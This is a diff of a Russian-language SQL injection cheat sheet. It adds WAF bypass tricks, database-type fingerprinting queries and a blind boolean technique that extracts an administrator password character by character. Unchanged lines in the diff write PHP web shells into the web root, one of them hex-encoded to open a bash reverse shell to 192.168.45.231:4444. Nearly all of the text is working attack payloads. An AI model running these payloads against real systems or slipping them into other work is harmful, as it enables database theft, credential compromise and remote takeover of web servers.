@@ -12,6 +12,16 @@ SELECT * FROM users WHERE (username = '[INPUT]') 	=> ') or 1=1 -- //
 SELECT * FROM users WHERE username = "[INPUT]"  	=> " or 1=1 -- //	Oracle, PostgreSQL?, MSSQL?, MySQL?
 SELECT * FROM users WHERE (username = "[INPUT]")	=> ") or 1=1 -- //
 
+Обход WAF:
+' union select 0x414141 -- 
+' union sele/**/ct 1,2 -- 
+
+Определение типа БД:
+' union select @@version --		-- MySQL/MSSQL
+' union select version() --		-- PostgreSQL/MySQL
+' union select banner from v$version where rownum=1 --		-- Oracle
+' union select sqlite_version() --	-- SQLite
+Также по вызову времени задержки
 
 ========================================================
 ================SQL INJECTION. MySQL 3306
@@ -57,10 +67,6 @@ select column_name	from information_schema.columns	WHERE table_name='users'	коло
 ' and updatexml(1,concat(0x7e,version()),1) --   тоже самое, также можно выполнять другие команды select
 ' and+0=sleep(10)+-- // проверка при слепой инъекции на то, что текущая БД - MySQL, если так, то задержка 10 сек
 
-Обход WAF:
-' union select 0x414141 -- 
-' union sele/**/ct 1,2 -- 
-
 Запись в файл:
 ' union select ' \"<?php system(\$_GET['cmd']);?>\"' into outfile '/var/www/html/tmp/webshell.php'  -- //
 ' union select 'a', 'b', 'c', 'd', 0x3c3f7068702073797374656d282262617368202d63202762617368202d69203e26202f6465762f7463702f3139322e3136382e34352e3233312f3434343420303e26312722293b203f3e, 'f' into outfile '/var/www/html/webshell.php' -- "
@@ -89,7 +95,7 @@ select current_database();        -- текущая БД
 select pg_sleep(5);               -- задержка
 select count(*) from table;       -- количество строк
 'foo'||'bar'
-SUBSTRING('foobar', 4, 2)
+SUBSTRING('foobar', 4, 2)		-- "ba"
 select current_user;                       -- текущий пользователь
 select session_user;                        -- пользователь сессии
 select is_superuser;                         -- является ли суперпользователем
@@ -135,7 +141,9 @@ Error-based:
 ' and (select 123 from users limit 1)=123 -- // проверка, что есть таблица users
 ' and (select 123 from users where username='administrator')=123 -- //
 ' and (select 123 from users where username='administrator' and LENGTH(password)>3)=123 -- //
-
+'+and+(select+substring(password,1,1)+from+users+where+username='administrator')='a'+-- // прогон пароля посимвольно в интрудере бурпа
+'+and+(select+substring(password,1,14)+from+users+where+username='administrator')='gwm4bpt90wwtwa'+-- // процесс, когда уже нашлись 13 символов,
+	последняя буква 'a' ставится в значок параграфа для перебора, Payloads  - Brouteforcer с длинами от 1 до 1
 
 ========================================================
 ================SQL INJECTION. MSSQL 1433
